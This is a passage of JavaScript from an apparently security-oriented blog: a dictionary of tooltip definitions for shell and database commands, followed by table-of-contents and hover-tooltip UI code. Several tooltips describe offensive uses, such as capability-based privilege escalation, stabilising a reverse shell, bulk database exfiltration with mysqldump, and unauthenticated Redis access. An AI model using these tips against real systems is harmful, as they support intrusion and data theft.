    screen:        'A terminal multiplexer — keeps a shell session (and anything running inside it) alive on a remote host even if the SSH connection drops, and lets you reattach to exactly where you left off.',
    tmux:          'A modern terminal multiplexer — functionally similar to screen, keeping sessions alive across disconnects with reattachable, splittable panes.',
    getcap:        'Lists Linux capabilities assigned to binaries on the filesystem — a binary with cap_setuid+ep, for example, can change its own UID despite not being SUID-root, a privilege-escalation vector a SUID-only search would miss.',
    getfacl:       "Displays the full POSIX ACL of a file or directory, including extended permissions beyond the standard owner/group/other bits — catches access grants that plain ls -l can't show at all.",
    telnet:        'An unencrypted remote terminal protocol/client — rarely used for its original purpose anymore, but still useful for manually opening a raw TCP connection to probe a plaintext protocol (HTTP, SMTP) by hand.',
    nohup:         'Runs a command immune to the SIGHUP signal, so it keeps running after the parent shell/SSH session that launched it exits — a common way to keep a long-running listener alive across a disconnected session.',
    watch:         'Re-runs a given command on a fixed interval and displays the output in place — useful for monitoring a log file, process list, or file count changing in near-real-time.',
    pgrep:         'Searches running processes by name and prints matching PIDs — a quick, scriptable alternative to piping ps through grep.',
    wc:            'Counts lines, words, or bytes in input — wc -l is the standard quick way to count how many lines a file or piped command output contains.',
    cut:           'Extracts specific columns from delimiter-separated text — cut -d: -f1 pulls just the username field out of /etc/passwd.',
    diff:          'Compares two files line-by-line and shows what changed — useful for confirming a config modification, or in reverse engineering for spotting exactly what changed between two binary versions’ disassembly.',
    cmp:           'Compares two files byte-by-byte and reports the offset of the first difference — faster than diff when you just need to know whether two files are identical.',
    file:          'Identifies a file’s actual type by inspecting its magic bytes rather than trusting its extension — the first command worth running against anything with a suspicious or disguised file extension.',
    stty:          'Configures terminal line settings — stty raw -echo is the standard fix for a netcat/raw reverse shell that doesn’t handle Ctrl+C or tab completion properly.',
    showmount:     'Lists NFS exports available from a remote host (-e) — the NFS equivalent of listing SMB shares, the first step before attempting to mount one.',
    kill:          'Sends a signal to a running process by PID — most commonly SIGTERM (15) for a graceful stop or SIGKILL (9) to force-terminate a process that isn’t responding.',
    iptables:      'Configures Linux kernel packet filtering rules — used defensively to firewall a host, and operationally to set up NAT or port-forwarding rules on a pivot box.',
    make:          'Builds a project according to its Makefile’s compilation rules — commonly the last step before running a freshly downloaded local exploit’s source code, after ./configure if one exists.',

    /* ── Database CLIs ── */
    mysql:         'The standard command-line client for connecting to and querying a MySQL/MariaDB server — -u/-p/-h select the user, password, and host; once connected, ordinary SQL statements run directly against the database.',
    mysqldump:     'Exports a MySQL/MariaDB database (schema and/or data) to a portable SQL script — used for backups, and just as usefully by an attacker with read access for fast bulk exfiltration of an entire database in one command.',
    'redis-cli':   'The standard command-line client for Redis — many Redis deployments historically ran with no authentication at all, making redis-cli -h <target> enough to read and write every key in the database directly.',
    mongosh:       'The modern MongoDB shell — connects to a MongoDB instance for interactive queries; like Redis, MongoDB has a long history of internet-exposed instances with no authentication enabled by default.',
    sqlite3:       'The command-line shell for SQLite — since SQLite databases are single files (often embedded in mobile apps, browsers, or forensic artifacts), this is frequently how you directly query a .db/.sqlite file pulled from a disk image.',
    'psql.exe':    'The standard command-line client for PostgreSQL — shows up in Windows contexts because several enterprise backup products (notably Veeam) bundle a PostgreSQL backend alongside this client.',
    'sqlcmd.exe':  'Microsoft’s command-line client for SQL Server — used both for legitimate database administration and, post-exploitation, for manipulating a compromised application’s MSSQL backend directly.',
    odat:          'The Oracle Database Attacking Tool — automates common Oracle-specific attacks: brute-forcing the SID and credentials, then escalating through known stored-procedure privilege-escalation primitives specific to Oracle.',
  };

  /* ── Heading helpers ────────────────────────────────────────────────────── */
  function headingLevel(h) {
    return h.tagName === 'H3' ? 3 : (h.tagName === 'H4' ? 4 : 2);
  }
  function headingLabel(h) {
    var span = h.querySelector('.heading-text');
    return (span ? span.textContent : h.textContent).trim();
  }

  /* ── Mobile collapsible ToC (C-7) ───────────────────────────────────────── */
  function buildMobileToc(headings) {
    if (window.innerWidth >= 1380 || headings.length < 2) return;
    var postBody = document.querySelector('.post-body');
    if (!postBody) return;

    var details = document.createElement('details');
    details.className = 'mobile-toc';

    var summary = document.createElement('summary');
    summary.textContent = 'Contents';
    details.appendChild(summary);

    var ul = document.createElement('ul');
    headings.forEach(function (h) {
      var li = document.createElement('li');
      li.className = headingLevel(h) >= 3 ? 'mobile-toc-sub' : 'mobile-toc-top';
      var a  = document.createElement('a');
      a.href = '#' + h.id;
      a.textContent = headingLabel(h);
      a.addEventListener('click', function (e) {
        e.preventDefault();
        details.open = false;
        var y = h.getBoundingClientRect().top + window.scrollY - 88;
        window.scrollTo({
          top: Math.max(0, y),
          behavior: matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth'
        });
      });
      li.appendChild(a);
      ul.appendChild(li);
    });
    details.appendChild(ul);

    postBody.insertBefore(details, postBody.firstChild);
  }

  /* ── Table of Contents ──────────────────────────────────────────────────── */
  /*
   * Long posts (40-90+ headings) used to render every heading as one flat,
   * equally-weighted list -- with that many entries simultaneously visible,
   * none of them were actually readable. Headings are now grouped under
   * their parent h2: only the group containing the section you're currently
   * reading auto-expands, everything else collapses to its h2 label. A
   * chevron lets you "pin" other groups open to peek ahead without losing
   * your current position.
   */
  function initToC() {
    var headings = Array.from(document.querySelectorAll('.heading-block .section-heading'));
    var bar      = document.getElementById('tocBar');
    if (!bar || headings.length < 2) return;

    /* Assign unique IDs */
    var seen = Object.create(null);
    headings.forEach(function (h) {
      var base = headingLabel(h).toLowerCase()
                  .replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || 'section';
      var id = base, n = 2;
      while (seen[id]) { id = base + '-' + n++; }
      seen[id] = true;
      h.id = id;
    });

    /* Title label */
    var title = document.createElement('div');
    title.className = 'toc-bar-title';
    title.textContent = 'On this page';
    bar.appendChild(title);

    function scrollToHeading(h) {
      var y = h.getBoundingClientRect().top + window.scrollY - 88;
      window.scrollTo({
        top: Math.max(0, y),
        behavior: matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth'
      });
    }

    /* Build link + group structure. Every h2 starts a new collapsible
       group; h3 (and deeper) headings nest inside the nearest preceding h2. */
    var groups    = [];   // { headerEl, subEl, hasChildren }
    var flatLinks = [];   // { a, groupIdx } -- one per heading, in document order

    headings.forEach(function (h, i) {
      var level = headingLevel(h);
      var a = document.createElement('a');
      a.href = '#' + h.id;
      a.textContent = headingLabel(h);
      a.dataset.idx = i;
      a.addEventListener('click', function (e) {
        e.preventDefault();
        scrollToHeading(h);
      });

      if (level <= 2 || groups.length === 0) {
        a.className = 'toc-link toc-link-h2';
        var headerEl = document.createElement('div');
        headerEl.className = 'toc-group-header';
        headerEl.appendChild(a);

        var subEl = document.createElement('div');
        subEl.className = 'toc-subgroup';

        var group = document.createElement('div');
        group.className = 'toc-group';
        group.appendChild(headerEl);
        group.appendChild(subEl);
        bar.appendChild(group);

        groups.push({ headerEl: headerEl, subEl: subEl, hasChildren: false });
      } else {
        a.className = 'toc-link toc-link-h3';
        var current = groups[groups.length - 1];
        current.subEl.appendChild(a);
        current.hasChildren = true;
      }

      flatLinks.push({ a: a, groupIdx: groups.length - 1 });
    });

    /* Chevron toggle for groups that actually have sub-headings; groups
       with none (a lone h2 before the next h2) get no toggle at all. */
    var pinned = Object.create(null);
    var autoActiveGroup = 0;

    function refreshGroups() {
      groups.forEach(function (g, idx) {
        var expanded = !!pinned[idx] || idx === autoActiveGroup;
        g.subEl.classList.toggle('toc-subgroup-open', expanded);
        g.headerEl.classList.toggle('toc-group-open', expanded);
      });
    }

    groups.forEach(function (g, idx) {
      if (!g.hasChildren) {
        g.headerEl.classList.add('toc-group-leaf');
        return;
      }
      var toggle = document.createElement('button');
      toggle.type = 'button';
      toggle.className = 'toc-group-toggle';
      toggle.setAttribute('aria-label', 'Toggle subsections');
      toggle.innerHTML = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>';
      toggle.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        pinned[idx] = !pinned[idx];
        refreshGroups();
      });
      g.headerEl.appendChild(toggle);
    });

    bar.hidden = false;
    buildMobileToc(headings);

    /* Activate link + its group */
    var activeIdx = -1;
    var activeHeaderEl = null;
    function activate(idx) {
      if (idx === activeIdx) return;
      activeIdx = idx;
      flatLinks.forEach(function (item, i) {
        item.a.classList.toggle('toc-link-active', i === idx);
      });

      var groupIdx = flatLinks[idx] ? flatLinks[idx].groupIdx : 0;
      if (groupIdx !== autoActiveGroup) {
        autoActiveGroup = groupIdx;
        refreshGroups();
      }
      if (activeHeaderEl) activeHeaderEl.classList.remove('toc-group-header-current');
      activeHeaderEl = groups[groupIdx] ? groups[groupIdx].headerEl : null;
      if (activeHeaderEl) activeHeaderEl.classList.add('toc-group-header-current');

      /* Scroll active link into view within sidebar */
      var active = flatLinks[idx] && flatLinks[idx].a;
      if (active) {
        var aTop  = active.offsetTop;
        var aBot  = aTop + active.offsetHeight;
        var sTop  = bar.scrollTop;
        var sBot  = sTop + bar.clientHeight;
        if (aTop < sTop + 32)       bar.scrollTop = Math.max(0, aTop - 32);
        else if (aBot > sBot - 32)  bar.scrollTop = aBot - bar.clientHeight + 32;
      }
    }

    refreshGroups();
    requestAnimationFrame(function () { activate(0); });

    /* Scroll-based activation. Height/overlap is handled purely in CSS via
       `position: sticky`, which naturally stops the sidebar at the bottom
       of the article — no JS clamping needed. */
    var OFFSET = 120;
    function tick() {
      var best = 0;
      for (var i = 0; i < headings.length; i++) {
        if (headings[i].getBoundingClientRect().top <= OFFSET) best = i;
      }
      activate(best);
    }
    window.addEventListener('scroll', tick, { passive: true });
    tick();
  }

  /* ── Command tooltips ───────────────────────────────────────────────────── */
  function initCodeTooltips() {
    var tip = document.createElement('div');
    tip.className = 'cmd-tooltip';
    tip.hidden    = true;
    document.body.appendChild(tip);

    var hideTimer = null;

    function wordAt(node, offset) {
      var t = node.textContent;
      var s = offset, e = offset;
      while (s > 0 && /\S/.test(t[s - 1])) s--;
      while (e < t.length && /\S/.test(t[e])) e++;
      return t.slice(s, e).replace(/^[^a-zA-Z0-9_-]+|[^a-zA-Z0-9_-]+$/g, '');
    }

    function rangeAt(cx, cy) {
      if (document.caretRangeFromPoint) return document.caretRangeFromPoint(cx, cy);
      if (document.caretPositionFromPoint) {
        var p = document.caretPositionFromPoint(cx, cy);
        return p ? { startContainer: p.offsetNode, startOffset: p.offset } : null;
      }
      return null;
    }

    document.querySelectorAll('.api-code-block pre, .text-block pre').forEach(function (pre) {
      pre.addEventListener('mousemove', function (e) {
        clearTimeout(hideTimer);
        var range = rangeAt(e.clientX, e.clientY);
        if (!range || range.startContainer.nodeType !== Node.TEXT_NODE) {
          tip.hidden = true; return;
        }
        var word = wordAt(range.startContainer, range.startOffset).toLowerCase();
        var def  = CMD_TIPS[word];
        if (!def) { tip.hidden = true; return; }
        tip.innerHTML = '<b class="cmd-tip-name">' + word + '</b>' + def;
        var vw   = document.documentElement.clientWidth;
        var vh   = document.documentElement.clientHeight;
        var tipW = 320;
        var left = e.clientX + 14;
        if (left + tipW > vw - 12) left = e.clientX - tipW - 10;
        tip.style.left = left + 'px';
        /* Descriptions now run 1-3 sentences, so the box can be noticeably
           taller than the old one-liner — prefer placing it below the
           cursor, only flipping above when there isn't room underneath. */
        var top = e.clientY + window.scrollY + 20;
        if (e.clientY + 170 > vh) top = e.clientY + window.scrollY - 130;
        tip.style.top = top + 'px';
        tip.hidden = false;
      });
      pre.addEventListener('mouseleave', function () {
        hideTimer = setTimeout(function () { tip.hidden = true; }, 120);
      });
    });

    tip.addEventListener('mouseenter', function () { clearTimeout(hideTimer); });
    tip.addEventListener('mouseleave', function () { tip.hidden = true; });
  }

  document.addEventListener('DOMContentLoaded', function () {
    initToC();
    initCodeTooltips();
  });
}());
